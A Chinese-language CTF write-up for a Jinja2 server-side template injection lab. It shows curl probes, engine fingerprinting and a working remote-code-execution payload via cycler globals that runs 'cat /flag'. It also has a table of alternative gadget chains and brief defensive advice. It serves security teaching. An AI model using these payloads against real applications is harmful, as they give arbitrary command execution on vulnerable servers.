# Q38 · 综合 Jinja2 SSTI

- 靶机：`http://目标地址`
- Flag：`TOGOGO-flag{}`

## 0. 一眼看懂

首页是个 Greeting 表单 → `GET /greet?name=X` → 服务端把 `X` **拼**进模板再渲染，并提示 flag 在 `/flag`。这就是典型 **Jinja2 SSTI**：`{{...}}` 里的表达式会在服务端 Python 里跑。

伪代码（漏洞写法）：

```python
tpl = f"<h2>Hello, {name}!</h2>..."   # ❌ 用户输入进模板源
return render_template_string(tpl)
```

## 1. 手工三步走

> 注：浏览器/zsh 里 `{{}}` 会被 brace expansion 吃掉，**必须用 `curl --data-urlencode`** 或在浏览器地址栏直接粘贴让浏览器编码。

### Step 1 · 探针：是不是 SSTI？

```bash
curl -sG http://目标地址/greet --data-urlencode "name={{7*7}}"
# Hello, 49!
```

返回 `49` → 表达式被执行 → 100% SSTI。

### Step 2 · 指纹：是哪种模板引擎？

```bash
curl -sG http://目标地址/greet --data-urlencode "name={{7*'7'}}"
# Hello, 7777777!
```

`7777777` 说明 `字符串 * 整数 = 复制` → Python 语义 → **Jinja2**。
（对比：Mako 用 `${7*7}`；Twig 也会出 7777777 但不在 Python，本题响应头是 `Werkzeug/Python` 已经实锤。）

### Step 3 · RCE 读 flag

Jinja2 默认就把 `cycler` 暴露给模板。`cycler` 是定义在 `jinja2.utils` 里的类，它的 `__init__` 函数的 `__globals__` 就是 `jinja2.utils` 模块的全局命名空间，里面 import 了 `os`。三跳就到：

```
cycler           → <class 'jinja2.utils.Cycler'>
.__init__        → 这个类的初始化方法（绑定函数）
.__globals__     → 该函数所在模块的 globals dict，里面有 'os'
.os.popen('cat /flag').read()
```

完整 payload：

```bash
curl -sG http://目标地址/greet \
  --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}"
```

响应：

```
<h2>Hello, TOGOGO-flag{}
!</h2>
```

✅ FLAG = `TOGOGO-flag{}`

## 2. 为什么走 `cycler` 而不是 `''.__class__.__mro__...`

| 写法 | 长度 | 依赖 | 是否需要枚举索引 |
|------|------|------|------------------|
| `cycler.__init__.__globals__.os.popen(...)` | 短 | Jinja2 默认 global | ❌ 不用 |
| `''.__class__.__mro__[1].__subclasses__()[N](...)` | 长 | 通用 Python 反射 | ✅ N 因版本而异 |
| `config.__class__.__init__.__globals__['os'].popen(...)` | 中 | Flask `config` | ❌ 不用 |
| `lipsum.__globals__.os.popen(...)` | 短 | Jinja2 默认 global | ❌ 不用 |

短链优先。`cycler / lipsum / joiner / namespace` 任选一个都能直达 `os`。

## 3. 常见踩坑

| 现象 | 原因 | 解决 |
|------|------|------|
| `curl 'http://.../greet?name={{7*7}}'` 没反应 | zsh/bash 把 `{}` 当 brace expansion | 用 `--data-urlencode` |
| `cat /flag` 中 `/` 丢 | 没正确 URL 编码 | 同上，让 curl 帮你编 |
| `{{config.__class__}}` 报错 | 个别 Jinja2 沙箱关掉 `__class__` | 改 `cycler.__init__.__globals__` 路径 |
| `{% ... %}` 没回显 | statement 不输出返回值 | 用 `{{ ... }}` expression |
| `popen()` 没回显 | 没 `.read()` | 末尾补 `.read()` |

## 4. 一键脚本

见同目录 `main.py`：探针 + 指纹 + RCE 三步，正则抓 flag。

```bash
python3 main.py
# [+] FLAG: TOGOGO-flag{}
```

## 5. 防御要点（顺手记一下）

1. **永远不要把用户输入拼进模板源**，改用变量参数化：
   ```python
   return render_template_string("Hello, {{ name }}!", name=name)
   ```
2. 真要渲染用户内容，用 `SandboxedEnvironment` 并白名单 filter。
3. Flask 配 `escape`，关 debug，敏感文件别放进容器根目录。

> 一句话心智模型：`render_template_string + 字符串拼接 = RCE`。
